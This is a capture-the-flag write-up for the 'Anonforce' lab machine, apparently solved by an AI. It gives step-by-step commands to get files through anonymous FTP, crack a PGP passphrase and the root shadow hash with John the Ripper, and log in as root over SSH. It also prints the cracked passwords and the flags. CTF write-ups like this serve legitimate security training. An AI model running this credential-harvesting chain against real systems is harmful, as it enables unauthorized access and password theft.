# Anonforce CTF Writeup
(*solved by gemini 🤖🤖🤖*)
## Initial Enumeration

The engagement began with an initial Nmap scan against the target IP (10.49.187.188) to identify open ports and services.

```bash
nmap -p- --min-rate 10000 -oN nmap_all_ports.txt 10.49.187.188
nmap -sC -sV -p21,22 -oN nmap_detailed.txt 10.49.187.188
```

The scan revealed two open ports:
- **Port 21**: vsftpd 3.0.3 (Anonymous FTP login allowed)
- **Port 22**: OpenSSH 7.2p2 Ubuntu

The detailed Nmap script output indicated that the FTP server permitted anonymous access and, unusually, exposed the entire root filesystem (`/`).

## Exploitation - User Flag

Connecting to the FTP server anonymously allowed read access to the file system. Exploring the `/home` directory revealed a user named `melodias`.

Listing the contents of `/home/melodias`:
```bash
python3 -c '
import ftplib
ftp = ftplib.FTP("10.49.187.188")
ftp.login()
ftp.cwd("/home/melodias")
ftp.retrlines("LIST -al")
'
```

This confirmed the presence of the user flag, which could be read directly over FTP:
```bash
curl -s ftp://10.49.187.188/home/melodias/user.txt
```

**User Flag:** `606083fd33beb1284fc51f411a706af8`

## Privilege Escalation - Root Flag

Further enumeration of the FTP root directory revealed a non-standard folder named `/notread`. Checking its contents:

```bash
python3 -c '
import ftplib
ftp = ftplib.FTP("10.49.187.188")
ftp.login()
ftp.cwd("/notread")
ftp.retrlines("LIST -al")
'
```

This directory contained two interesting files: `backup.pgp` (an encrypted backup) and `private.asc` (a PGP private key). Both were downloaded for offline analysis:

```bash
wget ftp://10.49.187.188/notread/backup.pgp
wget ftp://10.49.187.188/notread/private.asc
```

### Cracking the PGP Key Passphrase

To decrypt `backup.pgp`, the PGP private key needed to be imported. However, the private key was protected by a passphrase. To crack this passphrase, `gpg2john` was used to convert the key into a format crackable by John the Ripper.

```bash
gpg2john private.asc > hash.txt
```

Using John the Ripper and the `rockyou.txt` wordlist, the passphrase was successfully cracked:

```bash
zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe hash.txt
```
**Cracked Passphrase:** `xbox360`

### Decrypting the Backup

With the passphrase known, the private key was imported into GPG, and the backup file was decrypted:

```bash
gpg --pinentry-mode loopback --passphrase xbox360 --import private.asc
gpg --pinentry-mode loopback --passphrase xbox360 --output backup.txt --decrypt backup.pgp
```

### Cracking the Root Password

Examining the decrypted `backup.txt` file revealed it was a copy of the server's `/etc/shadow` file, containing password hashes for users on the system, including `root`.

```bash
cat backup.txt
```

The `root` user's SHA-512 hash was extracted into a new file `shadow.txt`:

```bash
grep root backup.txt > shadow.txt
```

John the Ripper was used again with the `rockyou.txt` wordlist to crack the root hash:

```bash
zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe shadow.txt
```

**Cracked Root Password:** `hikari`

### Gaining Root Access

With the root password obtained, a secure shell connection was established as the root user:

```bash
sshpass -p 'hikari' ssh -o StrictHostKeyChecking=no root@10.49.187.188
```

Once logged in, the root flag was read:

```bash
cat /root/root.txt
```

**Root Flag:** `f706456440c7af4187810c31c6cebdce`

## Summary

The attack path involved:
1.  **Anonymous FTP Access**: Exploiting an overly permissive FTP configuration that exposed the root filesystem.
2.  **Information Disclosure**: Reading the user flag directly via FTP and discovering an encrypted backup and PGP private key in a hidden directory.
3.  **Offline Cracking**: Using `gpg2john` and John the Ripper to crack the PGP key passphrase (`xbox360`), allowing decryption of the backup file.
4.  **Credential Harvesting & Cracking**: Identifying the decrypted backup as an `/etc/shadow` file and cracking the root user's password hash (`hikari`).
5.  **Root SSH Login**: Utilizing the cracked credentials to log in via SSH and obtain the root flag.